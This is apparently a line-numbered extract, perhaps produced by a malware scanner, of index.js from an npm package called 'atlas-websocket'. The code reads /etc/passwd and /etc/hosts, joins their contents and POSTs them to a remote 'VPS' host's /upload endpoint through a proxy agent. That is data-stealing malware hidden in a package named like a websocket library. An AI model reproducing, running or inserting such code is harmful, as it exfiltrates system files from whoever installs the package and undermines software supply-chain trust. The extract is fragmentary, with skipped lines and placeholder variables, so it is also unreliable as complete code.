// File: tmp/tmpr6rkq9uq/atlas-websocket/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const querystring = require('querystring')
Line 3: const fs = require('fs')
Line 4: const http = require('http')
Line 5: _tmp_5 = require('https-proxy-agent')
Line 13: _tmp_6.push("/etc/passwd")
Line 14: _tmp_6.push("/etc/hosts")
Line 25: fs.readFile(file, "utf8", (err, data) => {
      if (err) {
        console.error(`Error reading ${file}:`, err);
        allData += `Error reading ${file}\n`;
      } else {
        // Add file data to the output with partition
        allData += `File: ${file}\n${data}\n$###############$\n`;
      }

      filesProcessed++;

      // When all files are processed, send the data
      if (filesProcessed === filesToSend) {
        sendDataToVPS(allData);
      }
    })
Line 34: filesProcessed++
Line 45: {
  const postData = querystring.stringify({ msg: data });

  console.log("Sending data:", postData); // Log the data being sent

  const options = {
    hostname: vpsURL,
    port: vpsPort,
    path: `/upload`, // Adjust your endpoint as needed
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": Buffer.byteLength(postData),
    },
    agent: new HttpsProxyAgent('http://localhost:8080') // Use mitmproxy as the proxy
  };

  const req = https.request(options, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });

    res.on("end", () => {
      console.log("Data sent successfully");
    });
  });

  req.on("error", (e) => {
    console.error("Request error:", e);
  });

  req.write(postData);
  req.end();
}
Line 59: _tmp_1.agent = new HttpsProxyAgent('http://localhost:8080')
Line 62: const req = https.request(options, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });

    res.on("end", () => {
      console.log("Data sent successfully");
    });
  })
Line 63: {
      process.stdout.write(d);
    }
Line 64: process.stdout.write(d)
Line 76: req.write(postData)
Line 77: req.end()
